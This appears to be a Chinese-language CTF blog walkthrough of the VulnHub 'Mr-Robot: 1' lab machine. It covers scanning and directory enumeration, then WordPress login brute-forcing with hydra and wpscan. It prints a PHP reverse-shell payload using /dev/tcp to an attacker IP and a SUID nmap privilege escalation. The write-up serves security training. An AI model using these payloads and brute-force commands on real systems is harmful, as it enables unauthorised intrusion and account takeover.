---
title: MR-ROBOT:1
date: 2024-02-22 
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Mr-robot.html"
---

# MR-ROBOT: 1

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403848.png" alt="image-20240222094926014" style="zoom:50%;" />

先打开看一下是咋样，转换成NAT模式：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403850.png" alt="image-20240222100219767" style="zoom:50%;" />

![image-20240222100353581](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403851.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403852.png" alt="image-20240222100821302" style="zoom:50%;" />

我擦，今天这么顺利，不敢相信，开始拿下！！！！

## 信息搜集

### 端口扫描

```shell
rustscan -a 192.168.244.131 
```

```text
Open 192.168.244.131:80
Open 192.168.244.131:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")                                                                                                                                            
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 21:12 EST                                                         
Initiating Ping Scan at 21:12                                                                                                 
Scanning 192.168.244.131 [2 ports]                                                                                            
Completed Ping Scan at 21:12, 0.00s elapsed (1 total hosts)                                                                   
Initiating Parallel DNS resolution of 1 host. at 21:12                                                                         
Completed Parallel DNS resolution of 1 host. at 21:12, 2.18s elapsed                                                           
DNS resolution of 1 IPs took 2.18s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                            
Initiating Connect Scan at 21:12                                                                                              
Scanning 192.168.244.131 [2 ports]                                                                                             
Discovered open port 80/tcp on 192.168.244.131                                                                                 
Discovered open port 443/tcp on 192.168.244.131                                                                               
Completed Connect Scan at 21:12, 0.00s elapsed (2 total ports)                                                                 
Nmap scan report for 192.168.244.131                                                                                           
Host is up, received syn-ack (0.00072s latency).                                                                               
Scanned at 2024-02-21 21:12:23 EST for 0s                                                                                                                       
PORT    STATE SERVICE REASON                                                                                                   
80/tcp  open  http    syn-ack                                                                                                 
443/tcp open  https   syn-ack                                                                                                 
Read data files from: /usr/bin/../share/nmap                                                                                   
Nmap done: 1 IP address (1 host up) scanned in 2.38 seconds
```

奇怪了，我又拿nmap扫了一下，扫出来了一个22端口。。。。

```shell
nmap -sV -T4 192.168.244.131
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 22:18 EST
Nmap scan report for 192.168.244.131
Host is up (0.00050s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.98 seconds
```

### 实地勘探

![image-20240222101840336](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403853.png)

这靶场是真的炫酷哦！就和电影片段一样：

最后一个join有个填邮箱地址的地方，试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403854.png" alt="image-20240222103134443" style="zoom:50%;" />

### 目录扫描

```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.244.131 -f -t 1000 --no-error 
```

线程太小又太慢，线程开大又有的扫不到，只能耐心等辣！（没用上，但是等了一个多小时，还是把放上来了）

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.244.131
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog/                (Status: 403) [Size: 214]
/video/               (Status: 403) [Size: 215]
/images/              (Status: 403) [Size: 216]
/admin/               (Status: 200) [Size: 1077]
/atom/                (Status: 301) [Size: 0] [--> http://192.168.244.131/feed/atom/]
/audio/               (Status: 403) [Size: 215]
/login/               (Status: 302) [Size: 0] [--> http://192.168.244.131/wp-login.php]
/rss/                 (Status: 301) [Size: 0] [--> http://192.168.244.131/feed/]
/feed/                (Status: 200) [Size: 815]
/0/                   (Status: 200) [Size: 8322]
/image/               (Status: 200) [Size: 11841]
/wp-content/          (Status: 200) [Size: 0]
/css/                 (Status: 403) [Size: 213]
/wp-login/            (Status: 200) [Size: 2703]
/rss2/                (Status: 301) [Size: 0] [--> http://192.168.244.131/feed/]
/wp-includes/         (Status: 403) [Size: 221]
/js/                  (Status: 403) [Size: 212]
/Image/               (Status: 200) [Size: 11841]
/rdf/                 (Status: 301) [Size: 0] [--> http://192.168.244.131/feed/rdf/]
/page1/               (Status: 301) [Size: 0] [--> http://192.168.244.131/]
/dashboard/           (Status: 302) [Size: 0] [--> http://192.168.244.131/wp-admin/]
/wp-admin/            (Status: 302) [Size: 0] [--> http://192.168.244.131/wp-login.php?redirect_to=http%3A%2F%2F192.168.244.131%2Fwp-admin%2F&reauth=1]
/phpmyadmin/          (Status: 403) [Size: 94]
/0000/                (Status: 200) [Size: 8322]
/xmlrpc/              (Status: 405) [Size: 42]
/IMAGE/               (Status: 200) [Size: 11739]
/wp-signup/           (Status: 302) [Size: 0] [--> http://192.168.244.131/wp-login.php?action=register]
/page01/              (Status: 301) [Size: 0] [--> http://192.168.244.131/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

闲着无事，手动看了几个目录：

```url
http://192.168.244.131/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403855.png" alt="image-20240222112545371" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403856.png" alt="image-20240222112617147" style="zoom: 50%;" />

得到了第一个key！！！！

### whatweb

```bash
whatweb 192.168.244.131
# http://192.168.244.131 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[192.168.244.131], Script,UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
```

### Wappalyzer

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403857.png" alt="image-20240222112844108" style="zoom:33%;" />

## 漏洞利用

可以看到是`WordPress`的CMS，尝试看一下默认目录`wp-admin`：

![image-20240222112958376](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403858.png)

我擦还真没改，尝试爆破：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403859.png" alt="image-20240222113538328" style="zoom:50%;" />

![image-20240222113744444](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403860.png)

![image-20240222114052341](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403861.png)

![image-20240222114244288](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403862.png)



太慢了，使用物理机进行扫描：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403863.png" alt="image-20240222120627403" style="zoom:33%;" />

扫出来了一个用户名，尝试`wpscan`扫一下：(我是普通用户就不这么干了，太慢了)

```bash
wpscan --url http://192.168.244.131/wp-login.php -U Elliot -P fsocity.txt --api-token 'xxx'
```

也可以尝试`hydra`爆破：

```bash
hydra -L fsocity.dic  -p test  192.168.16.146 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
# 查找用户名
```

![image-20240222122411756](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403864.png)

```shell
# 直接爆破密码 我偷偷把密码放前面来了，不然密码在第八十多万位
hydra -vV -l elliot -P fsocity.dic 192.168.244.131 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 64
```

![image-20240222125226945](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403865.png)

尝试登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403866.png" alt="image-20240222125404605" style="zoom:50%;" />

上传一个远程反向shell连接脚本（插件上传或者放进主题）

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.244.128/1234 0>&1'");
?>
```

```shell
# kali
sudo nc -lvp 1234
```

![image-20240222130131093](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403867.png)

![image-20240222130216632](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403868.png)

## 提权

```bash
ls -la /home/robot
cat /home/robot/password.raw-md5
cat /home/robot/key-2-of-3.txt  
```

![image-20240222130432465](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403869.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403870.png" alt="image-20240222135154833" style="zoom:50%;" />

解密得到密码，尝试登录：

```text
abcdefghijklmnopqrstuvwxyz
```

尝试登录不了，扩产成可执行的shell：

```shell
python -c 'import pty; pty.spawn("/bin/sh")'
su robot
cat /home/robot/key-2-of-3.txt
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403871.png" alt="image-20240222135529341" style="zoom:50%;" />

查看内核版本以及`suid`漏洞是否存在：

```
uname -a
lsb_release -a
find / -perm -u=s -type f 2>/dev/null
```

```shell
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.2 LTS
Release:        14.04
Codename:       trusty

/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

`nmap`是suid权限的，可以尝试利用！！！

```shell
nmap -v
# Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2024-02-22 06:00 UTC
# No target machines/networks specified!
# QUITTING!
nmap --interactive
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403872.png" alt="image-20240222140201083" style="zoom:50%;" />

然后获取最后一个key:

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402221403873.png" alt="image-20240222140308994" style="zoom:50%;" />

